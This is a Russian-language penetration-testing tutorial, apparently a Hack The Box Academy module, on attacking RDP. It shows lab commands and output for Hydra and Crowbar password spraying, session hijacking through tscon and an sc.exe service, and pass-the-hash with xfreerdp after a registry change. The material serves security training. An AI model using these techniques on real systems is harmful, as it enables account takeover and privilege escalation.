---

[Протокол удаленного рабочего стола (RDP)](https://en.wikipedia.org/wiki/Remote_Desktop_Protocol) — это проприетарный протокол, разработанный Microsoft, который предоставляет пользователю графический интерфейс для подключения к другому компьютеру по сети. Это также один из самых популярных инструментов администрирования, позволяющий системным администраторам централизованно управлять своими удаленными системами с теми же функциями, что и при работе на месте. Кроме того, поставщики управляемых услуг (MSP) часто используют этот инструмент для управления сотнями клиентских сетей и систем. К сожалению, хотя RDP значительно упрощает удаленное администрирование распределенных ИТ-систем, он также создает еще один канал для атак.

По умолчанию RDP использует порт `TCP/3389`. С помощью команды `Nmap`мы можем определить доступную службу RDP на целевом хосте:

  Атака на RDP

```shell-session
MuraMitchi@htb[/htb]# nmap -Pn -p3389 192.168.2.143 

Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-25 04:20 BST
Nmap scan report for 192.168.2.143
Host is up (0.00037s latency).

PORT     STATE    SERVICE
3389/tcp open ms-wbt-server
```

---

## Неправильные настройки

Поскольку RDP использует учетные данные пользователя для аутентификации, одним из распространенных способов атаки на протокол RDP является подбор пароля. Хотя это и нечастое явление, мы можем обнаружить службу RDP без пароля при наличии неправильной конфигурации.

Один из нюансов при попытке угадать пароль в системах Windows заключается в том, что следует учитывать политику паролей клиента. Во многих случаях учетная запись пользователя блокируется или отключается после определенного количества неудачных попыток входа. В этом случае мы можем использовать особый метод угадывания паролей, называемый [методом подбора пароля] `Password Spraying`. Этот метод работает путем попытки ввода одного и того же пароля для множества имен пользователей, прежде чем переходить к другому паролю, при этом необходимо избегать блокировки учетной записи.

С помощью инструмента [Crowbar](https://github.com/galkan/crowbar) мы можем выполнить атаку методом перебора паролей на службу RDP. В приведенном ниже примере пароль `password123`будет проверен на соответствие списку имен пользователей в `usernames.txt`файле. Атака обнаружила действительные учетные данные, такие как `administrator`: `password123`на целевом хосте RDP.

  Атака на RDP

```shell-session
MuraMitchi@htb[/htb]# cat usernames.txt 

root
test
user
guest
admin
administrator
```

#### Crowbar - перебор паролей RDP

  Атака на RDP

```shell-session
MuraMitchi@htb[/htb]# crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'

2022-04-07 15:35:50 START
2022-04-07 15:35:50 Crowbar v0.4.1
2022-04-07 15:35:50 Trying 192.168.220.142:3389
2022-04-07 15:35:52 RDP-SUCCESS : 192.168.220.142:3389 - administrator:password123
2022-04-07 15:35:52 STOP
```

Мы также можем использовать это `Hydra`для проведения атаки с использованием перебора паролей RDP.

#### Hydra - перебор паролей RDP

  Атака на RDP

```shell-session
MuraMitchi@htb[/htb]# hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-25 21:44:52
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 8 login tries (l:2/p:4), ~2 tries per task
[DATA] attacking rdp://192.168.2.147:3389/
[3389][rdp] host: 192.168.2.143   login: administrator   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-25 21:44:56
```

Мы можем подключиться к целевой системе по протоколу RDP, используя `rdesktop`клиент или `xfreerdp`клиент с действительными учетными данными.

#### Вход по RDP

  Атака на RDP

```shell-session
MuraMitchi@htb[/htb]# rdesktop -u admin -p password123 192.168.2.143

Autoselecting keyboard map 'en-us' from locale

ATTENTION! The server uses an invalid security certificate which can not be trusted for
the following identified reasons(s);

 1. Certificate issuer is not trusted by this system.
     Issuer: CN=WIN-Q8F2KTAI43A

Review the following certificate info before you trust it to be added as an exception.
If you do not trust the certificate, the connection atempt will be aborted:

    Subject: CN=WIN-Q8F2KTAI43A
     Issuer: CN=WIN-Q8F2KTAI43A
 Valid From: Tue Aug 24 04:20:17 2021
         To: Wed Feb 23 03:20:17 2022

  Certificate fingerprints:

       sha1: cd43d32dc8e6b4d2804a59383e6ee06fefa6b12a
     sha256: f11c56744e0ac983ad69e1184a8249a48d0982eeb61ec302504d7ffb95ed6e57

Do you trust this certificate (yes/no)? yes
```

![В терминале отображается команда rdesktop для подключения к Windows Server 2012 R2, при этом видны значки рабочего стола.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/116/rdp_session-7-2.png)

---

## Атаки, специфичные для протокола

Представим, что мы успешно получили доступ к компьютеру и имеем учетную запись с правами локального администратора. Если пользователь подключен к нашему скомпрометированному компьютеру через RDP, мы можем перехватить сеанс удаленного рабочего стола пользователя, чтобы повысить свои привилегии и выдать себя за его учетную запись. В среде Active Directory это может привести к захвату учетной записи администратора домена или расширению нашего доступа внутри домена.

#### Перехват RDP-сессии

Как показано в примере ниже, мы вошли в систему как пользователь `juurena`(UserID = 2), обладающий `Administrator`привилегиями. Наша цель — перехватить управление у пользователя `lewen`(User ID = 4), который также вошел в систему через RDP.

![Рабочий стол Windows Server с диспетчером задач и PowerShell, отображающими пользовательские сессии.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/116/rdp_session-1-2.png)

Для успешного выполнения операции выдачи себя за другого пользователя без его пароля нам необходимы соответствующие `SYSTEM`привилегии и использование исполняемого файла Microsoft [tscon.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon) , который позволяет пользователям подключаться к другой сессии рабочего стола. Это работает путем указания того, к какой сессии `SESSION ID`( в нашем примере это сессия) мы хотим подключиться и с каким именем сессии ( это наша текущая сессия). Например, следующая команда откроет новую консоль под указанным именем в рамках нашей текущей сессии RDP:`4``lewen``rdp-tcp#13``SESSION_ID`

  Атака на RDP

```cmd-session
C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

Если у нас есть права локального администратора, мы можем использовать несколько методов для `SYSTEM`их получения, например, [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) или [Mimikatz](https://github.com/gentilkiwi/mimikatz) . Простой трюк — создать службу Windows, которая по умолчанию будет запускаться от имени пользователя `Local System`и выполнять любой исполняемый файл с `SYSTEM`правами администратора. Мы будем использовать исполняемый файл [Microsoft sc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create) . Сначала мы указываем имя службы ( `sessionhijack`) и команду, которую хотим выполнить. После выполнения следующей команды будет создана `binpath`служба с именем .`sessionhijack`

  Атака на RDP

```cmd-session
C:\htb> query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM

C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"

[SC] CreateService SUCCESS
```

![В сессии PowerShell отображаются запросы пользователей и команда создания службы с сообщением об успешном выполнении.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/116/rdp_session-2-2.png)

Для выполнения команды можно запустить службу `sessionhijack`:

  Атака на RDP

```cmd-session
C:\htb> net start sessionhijack
```

После запуска службы `lewen`появится новый терминал с пользовательской сессией. С помощью этой новой учетной записи мы можем попытаться выяснить, какими правами она обладает в сети, и, возможно, нам повезет, и окажется, что пользователь является членом группы Help Desk с правами администратора на многих хостах или даже администратором домена.

![Сеанс PowerShell, демонстрирующий команду 'whoami' и диспетчер задач с пользовательскими сеансами.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/116/rdp_session-3-2.png)

_Примечание: Этот метод больше не работает на Server 2019._

---

## RDP Pass-the-Hash (PtH)

В ходе тестирования на проникновение нам может потребоваться доступ к приложениям или программному обеспечению, установленному в системе Windows пользователя, которое доступно только через графический интерфейс. Если у нас есть учетные данные целевого пользователя в открытом виде, подключение к системе по RDP не составит проблем. Однако что, если у нас есть только NT-хеш пользователя, полученный в результате атаки с использованием дампа учетных данных, например, из базы данных [SAM](https://en.wikipedia.org/wiki/Security_Account_Manager) , и мы не можем взломать хеш, чтобы получить пароль в открытом виде? В некоторых случаях мы можем выполнить атаку RDP PtH, чтобы получить доступ к графическому интерфейсу целевой системы, используя такие инструменты, как `xfreerdp`.

У этой атаки есть несколько особенностей:

- `Restricted Admin Mode`Параметр, который по умолчанию отключен, должен быть включен на целевом хосте; в противном случае мы получим следующее сообщение об ошибке:

![Сообщение об ошибке: Ограничения учетной записи препятствуют входу в систему из-за пустых паролей, ограниченного времени входа или ограничений политики. Кнопка «ОК» присутствует.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/116/rdp_session-4.png)

Это можно включить, добавив новый ключ реестра `DisableRestrictedAdmin`(REG_DWORD) в раздел `<region>` `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`. Для этого используется следующая команда:

#### Добавление ключа реестра DisableRestrictedAdmin

  Атака на RDP

```cmd-session
C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

![Редактор реестра показывает путь: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa. Выделенная запись: DisableRestrictedAdmin, REG_DWORD, значение 0.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/116/rdp_session-5.png)

После добавления ключа реестра мы можем использовать его `xfreerdp`с опцией `/pth`получения доступа по протоколу RDP:

  Атака на RDP

```shell-session
MuraMitchi@htb[/htb]# xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9

[09:24:10:115] [1668:1669] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state            
[09:24:10:115] [1668:1669] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr                                   
[09:24:10:115] [1668:1669] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd                                  
[09:24:10:115] [1668:1669] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr                                 
[09:24:11:427] [1668:1669] [INFO][com.freerdp.primitives] - primitives autodetect, using optimized                               
[09:24:11:446] [1668:1669] [INFO][com.freerdp.core] - freerdp_tcp_is_hostname_resolvable:freerdp_set_last_error_ex resetting error state
[09:24:11:446] [1668:1669] [INFO][com.freerdp.core] - freerdp_tcp_connect:freerdp_set_last_error_ex resetting error state        
[09:24:11:464] [1668:1669] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[09:24:11:464] [1668:1669] [WARN][com.freerdp.crypto] - CN = dc-01.superstore.xyz                                                     
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] - VERSION ={                                                              
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        ProductMajorVersion: 6                                           
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        ProductMinorVersion: 1                                           
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        ProductBuild: 7601                                               
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        Reserved: 0x000000                                               
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        NTLMRevisionCurrent: 0x0F                                        
[09:24:11:567] [1668:1669] [INFO][com.winpr.sspi.NTLM] - negotiateFlags "0xE2898235"

<SNIP>

```

Если это сработает, мы теперь сможем войти в систему через RDP под именем целевого пользователя, не зная его пароля в открытом виде.

![Сеанс удаленного рабочего стола, демонстрирующий работу PowerShell на Windows Server 2012 R2. Выполнена команда 'whoami', вывод: 'superstore\lewen'.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/116/rdp_session-6-2.png)

Следует помнить, что это не сработает против каждой системы Windows, с которой мы столкнемся, но всегда стоит попробовать в ситуации, когда у нас есть NTLM-хеш, мы знаем, что у пользователя есть права RDP на компьютере или группе компьютеров, и доступ к графическому интерфейсу пользователя в некоторой степени поможет нам в достижении цели нашей оценки.